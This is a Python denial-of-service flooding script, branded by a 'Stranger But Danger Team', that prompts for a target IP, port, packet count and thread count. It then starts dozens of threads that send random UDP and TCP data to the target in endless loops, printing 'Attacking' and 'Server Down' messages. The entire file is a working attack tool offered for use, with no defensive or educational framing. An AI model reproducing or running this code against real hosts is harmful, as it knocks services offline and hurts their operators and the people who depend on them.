import random
import socket
import threading
import os,sys
os.system("clear")
print("""\033[32m





























           """)
print("[Stranger But Danger Team]")
print("[Rare Tool For Sbd Only]")
print("[Coded By Finix/Storex]")
ip = str(input("-> Target Ip:"))
port = int(input("-> Target Port:"))
choice = str(input("Are You Sure?(y/n):"))
times = int(input("Packet - 75000:"))
threads = int(input("Threads - 28000:"))
os.system("clear")
def run():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            print("[!] Server Down")
            
def run2():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
            
def run3():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")

def run4():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
            
def run5():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            print("[!] No Host Reponse (Down) [!]")
            
def run6():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
            
def run7():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")

def run8():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
            
def run9():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Finix 💀 Attacking [!] %s Dan Port : %s"%(ip, port))
        except:
            print("[!] No Host Reponse (Down) [!]")
            
def run10():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
            
def run11():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")

def run12():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
            
def run13():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")

def run14():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run15():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run16():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run17():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run18():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run19():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run20():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run21():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run22():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run23():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run24():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run25():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run26():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run27():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run28():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run29():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run30():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run31():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run32():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
def run33():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking [!] %s And Port : %s"%(ip, port))
        except:
            s.close()
            print("[!] No Host Reponse (Down) [!]")
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
        th = threading.Thread(target = run6)
        th.start()
        th = threading.Thread(target = run7)
        th.start()
        th = threading.Thread(target = run8)
        th.start()
        th = threading.Thread(target = run9)
        th.start()
        th = threading.Thread(target = run10)
        th.start()
        th = threading.Thread(target = run11)
        th.start()
        th = threading.Thread(target = run12)
        th.start()
        th = threading.Thread(target = run13)
        th.start()
        th = threading.Thread(target = run14)
        th.start()
        th = threading.Thread(target = run15)
        th.start()
        th = threading.Thread(target = run16)
        th.start()
        th = threading.Thread(target = run17)
        th.start()
        th = threading.Thread(target = run18)
        th.start()
        th = threading.Thread(target = run19)
        th.start()
        th = threading.Thread(target = run20)
        th.start()
        th = threading.Thread(target = run21)
        th.start()
        th = threading.Thread(target = run22)
        th.start()
        th = threading.Thread(target = run23)
        th.start()
        th = threading.Thread(target = run24)
        th.start()
        th = threading.Thread(target = run25)
        th.start()
        th = threading.Thread(target = run26)
        th.start()
        th = threading.Thread(target = run27)
        th.start()
        th = threading.Thread(target = run28)
        th.start()
        th = threading.Thread(target = run29)
        th.start()
        th = threading.Thread(target = run30)
        th.start()
        th = threading.Thread(target = run31)
        th.start()
        th = threading.Thread(target = run32)
        th.start()
else:
        th = threading.Thread(target = run33)
        th.start()